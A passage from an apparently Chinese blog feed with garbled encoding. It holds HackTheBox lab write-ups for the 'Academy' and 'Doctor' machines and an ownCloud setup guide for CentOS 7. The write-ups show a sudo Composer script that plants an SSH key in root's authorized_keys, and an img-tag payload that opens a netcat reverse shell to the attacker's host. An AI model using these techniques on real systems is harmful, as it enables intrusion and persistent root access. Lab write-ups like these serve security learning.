root@JIYE</span><br></pre></td></tr></table></figure><p><code>ä¾æ¬¡ç¼–å†™</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mrb3n@academy:~$ TF=$(mktemp -d)</span><br><span class="line">mrb3n@academy:~$ vim $TF/composer.json</span><br><span class="line">&#123;&quot;scripts&quot;:&#123;&quot;SSH&quot;:&quot;echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIuoa+nxwrqqxtdN5zqWblCzN6U6ltR0eZXI+tnPHt2Dx/6ms2bEqSmAV66ETVyjXQKe2fHzNWdhjj4Y48M4eQY+iSR/IxqfxxLysspB0hzylreY+/ScKwvA7LcxoIUR8D5YZq5kGkGR50sO2m16l7kb2X7A9FO6SHTRPbGKlnFI7kypQCoYmgLX7czaci3Ol0pVpYAhFEiNZIt43uU8uwvGELQnj5j9pcPrJU7yDqA/Xm11PUe9x6wrUKmW3pwhiHLT/ONJm8OzBiGvIaAxEK/DvVarrt+DjrlXAugZw87aip+SlBJSpQDWPxk8rAwvCLx1lVvFRekPIvByaRwHHNYypenZHKJi8UCWwEKM004uw4gEuG6VKciPd/eCnrx5Xrufrg2IW9foB9JAFKUICN/be73uJe8DbGn0hLRN+Yr0rE7CDw+ZPqAMp4bKrf9FicUS8fS1eUmAMjIAAN6j6zbI2ftU5EaoJ27CW2evknUcSbgO7fx6hxwt0dliCpXZc=&#x27; &gt;&gt; /root/.ssh/authorized_keys&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">mrb3n@academy:~$ sudo composer --working-dir=$TF run-script SSH</span><br><span class="line">[sudo] password for mrb3n: </span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;mysqli.so&#x27; (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;pdo_mysql.so&#x27; (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line">Do not run Composer as root/super user! See https://getcomposer.org/root for details</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIuoa+nxwrqqxtdN5zqWblCzN6U6ltR0eZXI+tnPHt2Dx/6ms2bEqSmAV66ETVyjXQKe2fHzNWdhjj4Y48M4eQY+iSR/IxqfxxLysspB0hzylreY+/ScKwvA7LcxoIUR8D5YZq5kGkGR50sO2m16l7kb2X7A9FO6SHTRPbGKlnFI7kypQCoYmgLX7czaci3Ol0pVpYAhFEiNZIt43uU8uwvGELQnj5j9pcPrJU7yDqA/Xm11PUe9x6wrUKmW3pwhiHLT/ONJm8OzBiGvIaAxEK/DvVarrt+DjrlXAugZw87aip+SlBJSpQDWPxk8rAwvCLx1lVvFRekPIvByaRwHHNYypenZHKJi8UCWwEKM004uw4gEuG6VKciPd/eCnrx5Xrufrg2IW9foB9JAFKUICN/be73uJe8DbGn0hLRN+Yr0rE7CDw+ZPqAMp4bKrf9FicUS8fS1eUmAMjIAAN6j6zbI2ftU5EaoJ27CW2evknUcSbgO7fx6hxwt0dliCpXZc=&#x27;</span> &gt;&gt; /root/.ssh/authorized_keys</span></span><br><span class="line">mrb3n@academy:~$</span><br></pre></td></tr></table></figure><p><code>sshè¿›è¡Œè¿æ¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/.ssh# ssh -i id_rsa root@10.10.10.215</span><br><span class="line">kex_exchange_identification: read: Connection reset by peer</span><br><span class="line">Connection reset by 10.10.10.215 port 22</span><br><span class="line">root@JIYE:~/.ssh# ssh -i id_rsa root@10.10.10.215</span><br><span class="line">Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)</span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line">  System information as of Wed 09 Dec 2020 11:36:12 AM UTC</span><br><span class="line">  System load:             0.0</span><br><span class="line">  Usage of /:              44.4% of 15.68GB</span><br><span class="line">  Memory usage:            21%</span><br><span class="line">  Swap usage:              0%</span><br><span class="line">  Processes:               178</span><br><span class="line">  Users logged in:         1</span><br><span class="line">  IPv4 address for ens160: 10.10.10.215</span><br><span class="line">  IPv6 address for ens160: dead:beef::250:56ff:feb9:c8a</span><br><span class="line"> * Introducing self-healing high availability clustering for MicroK8s!</span><br><span class="line">   Super simple, hardened and opinionated Kubernetes for production.</span><br><span class="line"></span><br><span class="line">     https://microk8s.io/high-availability</span><br><span class="line">0 updates can be installed immediately.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line">Last login: Mon Nov  9 10:11:49 2020</span><br><span class="line">root@academy:~# ls</span><br><span class="line">academy.txt  root.txt  snap</span><br><span class="line">root@academy:~# cat root.txt </span><br><span class="line">********************</span><br><span class="line">root@academy:~#</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2020/12/09/HTB-academy/image-20201209140730144.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Centos7æ­å»ºownç§æœ‰ç½‘ç›˜</title>
    <link href="https://lunamoore.github.io/2020/11/25/Centos7%E6%90%AD%E5%BB%BAown%E7%A7%81%E6%9C%89%E7%BD%91%E7%9B%98/"/>
    <id>https://lunamoore.github.io/2020/11/25/Centos7%E6%90%AD%E5%BB%BAown%E7%A7%81%E6%9C%89%E7%BD%91%E7%9B%98/</id>
    <published>2020-11-25T06:02:46.000Z</published>
    <updated>2020-11-25T07:46:43.802Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-å®‰è£…apache"><a href="#1-å®‰è£…apache" class="headerlink" title="1.å®‰è£…apache"></a>1.å®‰è£…apache</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install httpd -y</span><br><span class="line">systemctl start httpd</span><br><span class="line">systemctl enable httpd</span><br></pre></td></tr></table></figure><h2 id="2-å®‰è£…é…ç½®PHP"><a href="#2-å®‰è£…é…ç½®PHP" class="headerlink" title="2.å®‰è£…é…ç½®PHP"></a>2.å®‰è£…é…ç½®PHP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release -y</span><br><span class="line"></span><br><span class="line">yum install -y http://rpms.remirepo.net/enterprise/remi-release-7.rpm yum-utils</span><br><span class="line"></span><br><span class="line">yum-config-manager --enable remi-php72</span><br><span class="line"></span><br><span class="line">yum install -y php php-mbstring php-gd php-mcrypt php-pear php-pspell php-pdo php-xml php-mysqlnd php-process php-pecl-zip php-xml php-intl php-zip php-zlib</span><br><span class="line"></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="3-å®‰è£…å¹¶é…ç½®Mariadb"><a href="#3-å®‰è£…å¹¶é…ç½®Mariadb" class="headerlink" title="3.å®‰è£…å¹¶é…ç½®Mariadb"></a>3.å®‰è£…å¹¶é…ç½®Mariadb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/yum.repos.d/MariaDB.10x.repo</span><br><span class="line">[mariadb]</span><br><span class="line">name = MariaDB</span><br><span class="line">baseurl = http://yum.mariadb.org/10.3/centos7-amd64</span><br><span class="line">gpgkey=https://yum.mariadb.org/RPM-GPG-KEY-MariaDB</span><br><span class="line">gpgcheck=1</span><br><span class="line"></span><br><span class="line">yum install -y MariaDB-server MariaDB-client</span><br><span class="line"></span><br><span class="line">systemctl start mariadb</span><br><span class="line">systemctl enable mariadb</span><br><span class="line"></span><br><span class="line">mysql_secure_installation</span><br><span class="line"></span><br><span class="line">create database ownclouddb;</span><br><span class="line">grant all privileges on ownclouddb.* to ownclouduser@localhost identified by &#x27;owncloudpwd&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><h2 id="4-å®‰è£…owncloud"><a href="#4-å®‰è£…owncloud" class="headerlink" title="4.å®‰è£…owncloud"></a>4.å®‰è£…owncloud</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/yum.repos.d/owncloud.repo</span><br><span class="line">[OwnCloud_10.x]</span><br><span class="line">name=wnCloud Server Version 10.x (CentOS 7)</span><br><span class="line">type=rpm-md</span><br><span class="line">baseurl=http://download.owncloud.org/download/repositories/production/CentOS_7</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://download.owncloud.org/download/repositories/production/CentOS_7/repodata/repomd.xml.key</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line">yum repolist</span><br><span class="line">yum clean expire-cache</span><br><span class="line">yum install owncloud -y</span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure><h2 id="5-é…ç½®é˜²ç«å¢™è§„åˆ™åŠSElinuxæˆ–å…³é—­"><a href="#5-é…ç½®é˜²ç«å¢™è§„åˆ™åŠSElinuxæˆ–å…³é—­" class="headerlink" title="5.é…ç½®é˜²ç«å¢™è§„åˆ™åŠSElinuxæˆ–å…³é—­"></a>5.é…ç½®é˜²ç«å¢™è§„åˆ™åŠSElinuxæˆ–å…³é—­</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --add-service=http</span><br><span class="line">firewall-cmd --permanent --add-service=https</span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">iptables -F</span><br><span class="line">setenforce 0</span><br></pre></td></tr></table></figure><h2 id="6-ç§»åŠ¨ç›®å½•"><a href="#6-ç§»åŠ¨ç›®å½•" class="headerlink" title="6.ç§»åŠ¨ç›®å½•"></a>6.ç§»åŠ¨ç›®å½•</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp -a /var/www/html/owncloud/* /var/www/html/</span><br><span class="line">chown -R apache:apache home/</span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure><h2 id="7-é…ç½®é¡µé¢"><a href="#7-é…ç½®é¡µé¢" class="headerlink" title="7.é…ç½®é¡µé¢"></a>7.é…ç½®é¡µé¢</h2><h3 id="ï¼ˆ1ï¼‰é…ç½®æ•°æ®åº“ç”¨æˆ·ç­‰"><a href="#ï¼ˆ1ï¼‰é…ç½®æ•°æ®åº“ç”¨æˆ·ç­‰" class="headerlink" title="ï¼ˆ1ï¼‰é…ç½®æ•°æ®åº“ç”¨æˆ·ç­‰"></a>ï¼ˆ1ï¼‰é…ç½®æ•°æ®åº“ç”¨æˆ·ç­‰</h3><img src="/2020/11/25/Centos7%E6%90%AD%E5%BB%BAown%E7%A7%81%E6%9C%89%E7%BD%91%E7%9B%98/image-20201125151255716.png" class><h3 id="ï¼ˆ2ï¼‰ç™»å…¥"><a href="#ï¼ˆ2ï¼‰ç™»å…¥" class="headerlink" title="ï¼ˆ2ï¼‰ç™»å…¥"></a>ï¼ˆ2ï¼‰ç™»å…¥</h3><img src="/2020/11/25/Centos7%E6%90%AD%E5%BB%BAown%E7%A7%81%E6%9C%89%E7%BD%91%E7%9B%98/image-20201125151643638.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-å®‰è£…apache&quot;&gt;&lt;a href=&quot;#1-å®‰è£…apache&quot; class=&quot;headerlink&quot; title=&quot;1.å®‰è£…apache&quot;&gt;&lt;/a&gt;1.å®‰è£…apache&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yum install httpd -y&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;systemctl start httpd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;systemctl enable httpd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;2-å®‰è£…é…ç½®PHP&quot;&gt;&lt;a href=&quot;#2-å®‰è£…é…ç½®PHP&quot; class=&quot;headerlink&quot; title=&quot;2.å®‰è£…é…ç½®PHP&quot;&gt;&lt;/a&gt;2.å®‰è£…é…ç½®PHP&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yum install epel-release -y&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;yum install -y http://rpms.remirepo.net/enterprise/remi-release-7.rpm yum-utils&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;yum-config-manager --enable remi-php72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;yum install -y php php-mbstring php-gd php-mcrypt php-pear php-pspell php-pdo php-xml php-mysqlnd php-process php-pecl-zip php-xml php-intl php-zip php-zlib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="LinuxæœåŠ¡" scheme="https://lunamoore.github.io/categories/Linux%E6%9C%8D%E5%8A%A1/"/>
    
    
    <category term="linux" scheme="https://lunamoore.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>HTB-doctor</title>
    <link href="https://lunamoore.github.io/2020/10/18/HTB-doctor/"/>
    <id>https://lunamoore.github.io/2020/10/18/HTB-doctor/</id>
    <published>2020-10-18T08:57:53.000Z</published>
    <updated>2021-01-15T11:56:49.469Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00ç®€è¿°"><a href="#0x00ç®€è¿°" class="headerlink" title="0x00ç®€è¿°"></a>0x00ç®€è¿°</h2><img src="/2020/10/18/HTB-doctor/image-20201018151933161.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†22/80/8089ç«¯å£ï¼Œ8089å¯¹åº”çš„æœåŠ¡ä¸ºsplunk</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# nmap -sC -sV -sT 10.10.10.209 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 03:21 EDT</span><br><span class="line">Nmap scan report for 10.10.10.209</span><br><span class="line">Host is up (0.35s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Doctor</span><br><span class="line">8089/tcp open  ssl/http Splunkd httpd</span><br><span class="line">| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser</span><br><span class="line">| Not valid before: 2020-09-06T15:57:27</span><br><span class="line">|_Not valid after:  2023-09-06T15:57:27</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 103.68 seconds</span><br><span class="line">root@JIYE:~/htb/doctor#</span><br></pre></td></tr></table></figure><h2 id="0x02-å…ˆè®¿é—®80ç«¯å£"><a href="#0x02-å…ˆè®¿é—®80ç«¯å£" class="headerlink" title="0x02.å…ˆè®¿é—®80ç«¯å£"></a>0x02.å…ˆè®¿é—®80ç«¯å£</h2><p><code>åŒæ ·çš„é…æ–¹åŒæ ·çš„å‘³é“ï¼Œæ·»åŠ ä¸€æ¡hosts  [doctors.htb    10.10.10.209]</code></p><img src="/2020/10/18/HTB-doctor/image-20201018152818636.png" class><h2 id="0x03-è®¿é—®doctors-htb"><a href="#0x03-è®¿é—®doctors-htb" class="headerlink" title="0x03.è®¿é—®doctors.htb"></a>0x03.è®¿é—®doctors.htb</h2><h3 id="1-å°è¯•ç®€å•æ³¨å…¥ï¼Œå¯æ˜¯æ²¡æœ‰ã€‚"><a href="#1-å°è¯•ç®€å•æ³¨å…¥ï¼Œå¯æ˜¯æ²¡æœ‰ã€‚" class="headerlink" title="1.å°è¯•ç®€å•æ³¨å…¥ï¼Œå¯æ˜¯æ²¡æœ‰ã€‚"></a>1.å°è¯•ç®€å•æ³¨å…¥ï¼Œå¯æ˜¯æ²¡æœ‰ã€‚</h3><img src="/2020/10/18/HTB-doctor/image-20201018154218860.png" class><h3 id="2-æ³¨å†Œç”¨æˆ·"><a href="#2-æ³¨å†Œç”¨æˆ·" class="headerlink" title="2.æ³¨å†Œç”¨æˆ·"></a>2.æ³¨å†Œç”¨æˆ·</h3><img src="/2020/10/18/HTB-doctor/image-20201018154351730.png" class><h3 id="3-ç™»å…¥"><a href="#3-ç™»å…¥" class="headerlink" title="3.ç™»å…¥"></a>3.ç™»å…¥</h3><img src="/2020/10/18/HTB-doctor/image-20201018154434150.png" class><h3 id="4-æ‰‹åŠ¨çˆ¬è™«"><a href="#4-æ‰‹åŠ¨çˆ¬è™«" class="headerlink" title="4.æ‰‹åŠ¨çˆ¬è™«"></a>4.æ‰‹åŠ¨çˆ¬è™«</h3><p><code>å‘ç°è€Œå·²æäº¤ç•™è¨€ï¼Œæ„Ÿè§‰åˆ°å­˜å‚¨å‹XSSçš„å‘³é“ã€‚ã€‚ã€‚</code></p><img src="/2020/10/18/HTB-doctor/image-20201018154824325.png" class><h3 id="5-æ„å»ºXSSä»£ç åå¼¹shell"><a href="#5-æ„å»ºXSSä»£ç åå¼¹shell" class="headerlink" title="5.æ„å»ºXSSä»£ç åå¼¹shell"></a>5.æ„å»ºXSSä»£ç åå¼¹shell</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://10.10.17.216/$(nc.traditional$IFS-e$IFS/bin/bash$IFS</span>&#x27;<span class="attr">10.10.17.216</span>&#x27;$<span class="attr">IFS</span>&#x27;<span class="attr">6666</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><p><code>kaliå…ˆç›‘å¬6666</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>æäº¤</code></p><img src="/2020/10/18/HTB-doctor/image-20201018155733291.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.209] 38714</span><br><span class="line">whoami</span><br><span class="line">web</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">web@doctor:~$ </span><br></pre></td></tr></table></figure><h3 id="6-å‡çº§shell"><a href="#6-å‡çº§shell" class="headerlink" title="6.å‡çº§shell"></a>6.å‡çº§shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">web@doctor:~$ ^Z</span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 6666</span><br><span class="line">root@JIYE:~/htb/doctor# stty raw -echo</span><br><span class="line">root@JIYE:~/htb/doctor# nc -nvlp 6666</span><br><span class="line"></span><br><span class="line">web@doctor:~$ </span><br><span class="line">web@doctor:~$ pwd</span><br><span class="line">/home/web</span><br><span class="line">web@doctor:~$</span><br></pre></td></tr></table></figure><h2 id="0x04-ç™»å…¥åˆ°shaunç”¨æˆ·"><a href="#0x04-ç™»å…¥åˆ°shaunç”¨æˆ·" class="headerlink" title="0x04.ç™»å…¥åˆ°shaunç”¨æˆ·"></a>0x04.ç™»å…¥åˆ°shaunç”¨æˆ·</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">web@doctor:~$ cd /home/</span><br><span class="line">web@doctor:/home$ ls</span><br><span class="line">shaun  web</span><br><span class="line">web@doctor:/home$ cd shaun/</span><br><span class="line">web@doctor:/home/shaun$ ls</span><br><span class="line">user.txt</span><br><span class="line">web@doctor:/home/shaun$ cat user.txt </span><br><span class="line">cat: user.txt: Permission denied</span><br><span class="line">web@doctor:/home/shaun$</span><br></pre></td></tr></table></figure><p><code>çˆ¬å–æ–‡ä»¶</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">web@doctor:~/blog$ cd /var/www/html/ </span><br><span class="line">web@doctor:/var/www/html$ ls</span><br><span class="line">about.html  contact.html  departments.html  images      js</span><br><span class="line">blog.html   css           fonts             index.html  services.html</span><br><span class="line">web@doctor:/var/www/html$ cd /var/lo</span><br><span class="line">local/ lock/  log/   </span><br><span class="line">web@doctor:/var/www/html$ cd /var/log/apache2/</span><br><span class="line">web@doctor:/var/log/apache2$ ls</span><br><span class="line">access.log        access.log.5.gz  error.log.10.gz  error.log.5.gz</span><br><span class="line">access.log.1      access.log.6.gz  error.log.11.gz  error.log.6.gz</span><br><span class="line">access.log.10.gz  access.log.7.gz  error.log.12.gz  error.log.7.gz</span><br><span class="line">access.log.11.gz  access.log.8.gz  error.log.13.gz  error.log.8.gz</span><br><span class="line">access.log.12.gz  access.log.9.gz  error.log.14.gz  error.log.9.gz</span><br><span class="line">access.log.2.gz   backup           error.log.2.gz   other_vhosts_access.log</span><br><span class="line">access.log.3.gz   error.log        error.log.3.gz</span><br><span class="line">access.log.4.gz   error.log.1      error.log.4.gz</span><br><span class="line">web@doctor:/var/log/apache2$ cat backup </span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;\x16\x03&quot; 400 0 &quot;-&quot; &quot;-&quot;</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;t3 12.1.2\n&quot; 400 0 &quot;-&quot; &quot;-&quot;</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;PROPFIND / HTTP/1.1&quot; 405 521 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;GET /.git/HEAD HTTP/1.1&quot; 404 453 &quot;-&quot; </span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">çœç•¥ä¸€å¤§å †ã€‚ã€‚ã€‚</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">web@doctor:/var/log/apache2$ cat backup | grep pass</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &quot;POST /reset_password?email=Guitar123&quot; 500 453 &quot;http://doctor.htb/reset_password&quot;</span><br><span class="line">web@doctor:/var/log/apache2$ 